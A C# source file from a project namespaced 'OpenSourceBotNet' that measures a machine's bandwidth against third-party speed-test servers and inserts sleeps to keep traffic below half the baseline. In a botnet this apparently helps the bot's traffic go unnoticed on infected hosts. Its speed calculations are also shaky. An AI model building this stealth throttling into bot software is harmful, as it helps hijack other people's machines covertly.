using System;
using System.Collections;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.NetworkInformation;
using System.Net;
using System.Net.Sockets;

using OpenSourceBotNet.Services;
using OpenSourceBotNet.Core;

namespace OpenSourceBotNet.Services.Resources
{
    public class NetworkThrottle : FluxService
    {
        public static int iThrottleUploadPause = 10;
        public static int iThrottleDownloadPause = 10;

        public static bool bMaxUploadReached = false;
        public static bool bMaxDownloadReached = false;

        private NetworkInterface primaryNic;

        public System.Threading.Thread thread;
        public System.Threading.Timer timer;

        public double dBaselineUploadSpeed = 0.0;
        public double dBaselineDownloadSpeed = 0.0;

        public double dCurrentUploadSpeed = 0.0;
        public double dCurrentDownloadSpeed = 0.0;

        public double dTotalBytesSent = 0.0;
        public double dTotalBytesReceived = 0.0;

        private bool bDidPerformanceTests = false;

        public NetworkThrottle()
        {
            pause = 1000;

            InitializeNetworkInterface();
        }

        public override void HeartBeat()
        {
            if (bDidPerformanceTests == false)
            {
                PerformanceTests();
                bDidPerformanceTests = true;
            }

            // Grab the stats for that interface
            IPv4InterfaceStatistics interfaceStats = primaryNic.GetIPv4Statistics();

            dCurrentDownloadSpeed = ((int)(interfaceStats.BytesReceived - dTotalBytesReceived) / 1024) / 60;
            dCurrentUploadSpeed = ((int)(interfaceStats.BytesSent - dTotalBytesSent) / 1024) / 60;

            if (dCurrentDownloadSpeed >= dBaselineDownloadSpeed / 2)
            {
                bMaxDownloadReached = true;
                iThrottleDownloadPause += 10;
            }
            else
            {
                iThrottleDownloadPause -= 10;
                bMaxDownloadReached = false;

                if (iThrottleDownloadPause <= 0)
                {
                    iThrottleDownloadPause = 10;
                }
            }

            if (dCurrentUploadSpeed >= dBaselineUploadSpeed / 2)
            {
                bMaxUploadReached = true;
                iThrottleUploadPause += 10;
            }
            else
            {
                iThrottleUploadPause -= 10;
                bMaxUploadReached = false;

                if (iThrottleUploadPause <= 0)
                {
                    iThrottleUploadPause = 10;
                }
            }

            dTotalBytesSent = interfaceStats.BytesSent;
            dTotalBytesReceived = interfaceStats.BytesReceived;
        }

        public static void ThrottleNetwork()
        {
            ThrottleNetworkDownload();
            ThrottleNetworkUpload();
        }

        public static void ThrottleNetworkDownload()
        {
            System.Threading.Thread.Sleep(iThrottleDownloadPause);
        }

        public static void ThrottleNetworkUpload()
        {
            System.Threading.Thread.Sleep(iThrottleUploadPause);
        }

        private void InitializeNetworkInterface()
        {
            try
            {
                UdpClient u = new UdpClient("8.8.8.8", 53);
                IPAddress localAddr = ((IPEndPoint)u.Client.LocalEndPoint).Address;
                try
                {
                    foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                    {
                        IPInterfaceProperties ipProps = nic.GetIPProperties();
                        // check if localAddr is in ipProps.UnicastAddresses
                        try
                        {
                            foreach (UnicastIPAddressInformation uIp in ipProps.UnicastAddresses)
                            {
                                try
                                {
                                    if (uIp.Address.Address == localAddr.Address)
                                    {
                                        primaryNic = nic;
                                        break;
                                    }
                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine(ex.ToString());
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.ToString());
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }

        public void PerformanceTests()
        {
            PerformanceUploadTest();
            PerformanceDownloadTest();
        }

        public void PerformanceUploadTest()
        {
            if (System.IO.File.Exists(System.Windows.Forms.Application.StartupPath + "\\uploadspeed.txt"))
            {
                dBaselineUploadSpeed = double.Parse(System.IO.File.ReadAllText(System.Windows.Forms.Application.StartupPath + "\\uploadspeed.txt"));
            }
            else
            {
                System.Net.WebClient wc = new System.Net.WebClient();

                string sTemplate = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

                int iMax = 5427880;
                string sData = "";
                for (int iOne = 0; iOne < iMax; iOne = iOne + 100000)
                {
                    sData += sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate;
                    sData += sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate;
                    sData += sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate;
                    sData += sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate;
                    sData += sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate;
                    sData += sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate;
                    sData += sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate;
                    sData += sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate;
                    sData += sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate;
                    sData += sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate + sTemplate;
                }

                string tempName = System.IO.Path.GetTempFileName();

                double starttime = Environment.TickCount;

                wc.Headers["Content-Type"] = "application/x-www-form-urlencoded";
                string response = wc.UploadString("http://www.ozspeedtest.com/bandwidth-test/upload", "submit=Run+Upload+Test+%3E%3E%3E&st=1411533974672&conType=7&data=" + sData.Length.ToString() + "&0=" + sData);

                double stoptime = Environment.TickCount;

                double secs = Math.Floor(stoptime - starttime) / 1000;
                double sec2 = Math.Round(secs);
                double kbsec = Math.Round(1024 / secs);

                dBaselineUploadSpeed = kbsec;

                System.IO.File.WriteAllText(System.Windows.Forms.Application.StartupPath + "\\uploadspeed.txt", dBaselineUploadSpeed.ToString());

                System.IO.File.Delete(tempName);
            }
        }

        public void PerformanceDownloadTest()
        {
            if (System.IO.File.Exists(System.Windows.Forms.Application.StartupPath + "\\downloadspeed.txt"))
            {
                dBaselineDownloadSpeed = double.Parse(System.IO.File.ReadAllText(System.Windows.Forms.Application.StartupPath + "\\downloadspeed.txt"));
            }
            else
            {
                System.Net.WebClient wc = new System.Net.WebClient();

                string tempName = System.IO.Path.GetTempFileName();

                double starttime = Environment.TickCount;

                wc.DownloadFile("http://download.mosaicdataservices.com/5MB.zip", tempName);

                double stoptime = Environment.TickCount;

                double secs = Math.Floor(stoptime - starttime) / 1000;
                double sec2 = Math.Round(secs);
                double kbsec = Math.Round(1024 / secs);

                dBaselineDownloadSpeed = kbsec;

                System.IO.File.WriteAllText(System.Windows.Forms.Application.StartupPath + "\\downloadspeed.txt", dBaselineDownloadSpeed.ToString());

                System.IO.File.Delete(tempName);
            }
        }
    }
}
